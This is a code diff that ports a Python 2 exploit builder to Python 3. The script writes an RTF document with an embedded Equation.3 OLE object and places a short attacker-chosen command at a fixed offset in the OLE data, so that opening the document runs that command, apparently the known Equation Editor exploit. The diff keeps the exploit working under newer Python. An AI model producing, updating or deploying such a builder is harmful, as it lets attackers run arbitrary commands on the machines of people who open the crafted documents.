@@ -1,19 +1,20 @@
 import argparse
+import binascii
 
 
-RTF_HEADER = R"""{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}}
+RTF_HEADER = rb"""{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}}
 {\*\generator Riched20 6.3.9600}\viewkind4\uc1
 \pard\sa200\sl276\slmult1\f0\fs22\lang9"""
 
 
-RTF_TRAILER = R"""\par}
+RTF_TRAILER = rb"""\par}
 """
 
 
-OBJECT_HEADER = R"""{\object\objemb\objupdate{\*\objclass Equation.3}\objw380\objh260{\*\objdata """
+OBJECT_HEADER = rb"""{\object\objemb\objupdate{\*\objclass Equation.3}\objw380\objh260{\*\objdata """
 
 
-OBJECT_TRAILER = R"""
+OBJECT_TRAILER = rb"""
 }{\result{\pict{\*\picprop}\wmetafile8\picw380\pich260\picwgoal380\pichgoal260
 0100090000039e00000002001c0000000000050000000902000000000500000002010100000005
 0000000102ffffff00050000002e0118000000050000000b0200000000050000000c02a0016002
@@ -28,7 +29,7 @@ OBJECT_TRAILER = R"""
 """
 
 
-OBJDATA_TEMPLATE = R"""
+OBJDATA_TEMPLATE = rb"""
 01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1
 b11ae1000000000000000000000000000000003e000300feff090006000000000000000000000001
 0000000100000000000000001000000200000001000000feffffff0000000000000000ffffffffff
@@ -120,14 +121,13 @@ ffffffff000010000000c0ffffffc6ffffffe01d0000660100000b00000026060f000c004d617468
 7cef1800040000002d01010004000000f0010000030000000000
 """
 
-
 COMMAND_OFFSET = 0x949*2
 
 def create_ole_exec_primitive(command):
     if len(command) > 43:
         raise ValueError("primitive command must be shorter than 43 bytes")
-    hex_command = command.encode("hex")
-    objdata_hex_stream = OBJDATA_TEMPLATE.translate(None, "\r\n")
+    hex_command = binascii.hexlify(command.encode("utf-8"))
+    objdata_hex_stream = OBJDATA_TEMPLATE.translate(None, b"\r\n")
     ole_data = objdata_hex_stream[:COMMAND_OFFSET] + hex_command + objdata_hex_stream[COMMAND_OFFSET + len(hex_command):]
     return OBJECT_HEADER + ole_data + OBJECT_TRAILER
 
@@ -146,7 +146,7 @@ if __name__ == '__main__':
 
     rtf_content = create_rtf(RTF_HEADER, RTF_TRAILER, args.exe)
 
-    output_file = open(args.output, "w")
+    output_file = open(args.output, "wb")
     output_file.write(rtf_content)
 
-    print "File " + args.output + " created."
+    print("File " + args.output + " created.")
